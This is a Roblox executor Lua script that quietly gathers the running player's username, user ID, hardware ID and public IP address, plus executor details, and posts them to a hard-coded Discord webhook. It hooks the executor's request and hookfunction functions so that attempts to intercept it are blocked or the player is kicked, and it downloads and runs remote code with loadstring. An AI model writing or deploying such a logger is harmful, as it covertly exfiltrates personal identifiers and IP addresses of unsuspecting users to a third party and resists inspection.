if request and hookfunction then
    local oldh
    local oldr

    getgenv().hd = true
    oldr = hookfunction(request, function(...)
        local args = {...}
        if not getgenv().hd then
            return oldr(...)
        else
            --game.Players.LocalPlayer:Kick()
            return nil
        end
    end)
    oldh = hookfunction(hookfunction, function(...)
        local args = {...}
        if not getgenv().hd then
            return oldh(...)
        else
            game.Players.LocalPlayer:Kick()
            return nil
        end
    end)


    local function gam()
        local thumbnail_url = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds="..tostring(game.PlaceId).."&size=256x256&format=Png&isCircular=false"
        local response = game:HttpGet(thumbnail_url)
        local jsonResponse = game.HttpService:JSONDecode(response)
        local imageUrl = jsonResponse.data[1].imageUrl
        return jsonResponse.data[1].imageUrl
    end

    local function plr() -- https://thumbnails.roblox.com/v1/games/icons?universeIds=137925884276740&size=100x100&format=Png&isCircular=false
        local thumbnail_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds="..tostring(game.Players.LocalPlayer.UserId).."&size=100x100&format=Png&isCircular=true"
        local response = game:HttpGet(thumbnail_url)
        local jsonResponse = game.HttpService:JSONDecode(response)
        local imageUrl = jsonResponse.data[1].imageUrl
        return jsonResponse.data[1].imageUrl
    end

    local function place()
        return {game.PlaceId,game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name}
    end

    local function getunc()
        getgenv().hd = false
        local unc = tostring(loadstring(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/returnc.lua"))()) .. "%"
        getgenv().hd = true
        return unc
    end

    local url = "https://discord.com/api/webhooks/1402028476927709367/s7nnQWFrNrJUvR_C5veuka4nPTsSyS5GIY0mh4twn2wiRHcivP3vnDNBFQ6DDQlVdEUm"
    local HttpService = game:GetService("HttpService")
    function SendMessageEMBED(webhookUrl)
        local data = {
            ["content"] = " - ",
            ["embeds"] = {
                {
                ["title"] = place()[2].." :: " .. game.Players.LocalPlayer.Name .. " :: " .. tostring(game.Players.LocalPlayer.UserId),
                ["color"] = 13386563,
                ["fields"] = {
                    {
                    ["name"] = "User",
                    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
                    },
                    {
                    ["name"] = "Place",
                    ["value"] = "```yaml\nPlaceId: ".. tostring(game.PlaceId) .."\nPlaceName: ".. place()[2] .."\n```"
                    },
                    {
                    ["name"] = "Executor",
                    ["value"] = "```yaml\nExecutor Name: ".. tostring(identifyexecutor() or "Unknown") .."\nExecutor Level: ".. tostring(getidentity() or "-1") .."\nExecutor UNC: ".. getunc() .."\n```"
                    }
                },
                ["image"] = {
                    ["url"] = gam()
                },
                ["thumbnail"] = {
                    ["url"] = plr()
                }
                }
            },
            ["attachments"] = {}
        }

        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end

    SendMessageEMBED(url)
end

getgenv().hd = nil
table.remove(getgenv(), hd)
